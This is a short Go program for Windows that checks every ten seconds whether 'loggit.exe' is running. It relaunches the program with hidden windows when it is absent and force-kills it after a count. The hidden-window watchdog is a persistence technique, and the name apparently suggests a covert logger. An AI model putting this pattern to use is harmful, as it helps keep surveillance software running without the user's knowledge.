package main

import (
//"log"
"os/exec"
"time"
"fmt"
"syscall"
//"strconv"
//"strings"
)

var ctr int

func main() {
	for {
		cmnd1 := exec.Command("cmd", "/C","tasklist|findstr loggit.exe")
		cmnd1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, err := cmnd1.Output()
		cmnd1.Start()
		//fmt.Println(out)
		if string(out) == "" {
			cmnd2 := exec.Command("loggit.exe", "arg")
			cmnd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmnd2.Start()
		} else if ctr >= 10 {
			cmnd3 := exec.Command("cmd", "/C", "taskkill /IM loggit.exe /F")
			cmnd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmnd3.Start()
			fmt.Println("taskill " + string(out) + string(ctr))
		} else {
			fmt.Println(ctr)
			ctr++
		}
		if err != nil {}
		time.Sleep(10 * time.Second)
	}
}
